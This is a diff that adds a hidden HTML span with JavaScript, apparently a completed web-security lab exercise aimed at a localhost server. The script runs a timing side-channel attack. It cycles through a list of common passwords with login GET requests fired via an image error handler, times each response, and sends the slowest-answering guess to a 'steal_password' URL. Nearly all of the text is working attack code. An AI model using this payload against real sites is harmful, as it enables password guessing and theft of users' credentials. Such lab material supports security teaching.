@@ -1,0 +1,47 @@
+<span style='display:none'>
+  <img id='test'/>
+  <script>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+
+    var longest_time = 0;
+    var pass_idx = 0;
+    var password = dictionary[index];
+
+    var test = document.getElementById(`test`);
+    test.onerror = () => {
+      var end = new Date();
+      
+      var time_elapsed = end - start;
+      if (time_elapsed > longest_time) {
+        longest_time = time_elapsed;
+        pass_idx = index;
+      }
+
+      /* >>>> HINT: you might want to replace this line with something else. */
+      console.log(`Time elapsed ${end-start}`);
+      /* <<<<< */
+
+      start = new Date();
+
+      password = dictionary[index];
+
+      if (index < dictionary.length) {
+        /* >>>> TODO: replace string with login GET request */
+        test.src = `http://localhost:3000/get_login?username=userx&password=${password}`;
+        /* <<<< */
+      } else {
+        theft_url = `http://localhost:3000/steal_password?password=${dictionary[pass_idx]}&timeElapsed=${longest_time}`;
+        const theft = new Image();
+        theft.src = theft_url;
+        /* >>>> TODO: analyze server's reponse times to guess the password for userx and send your guess to the server <<<<< */
+      }
+      index += 1;
+    };
+    var start = new Date();
+    /* >>>> TODO: replace string with login GET request */
+    test.src = `http://localhost:3000/get_login?username=userx&password=${password}`;
+    /* <<<< */
+    index += 1;
+  </script>
+</span>
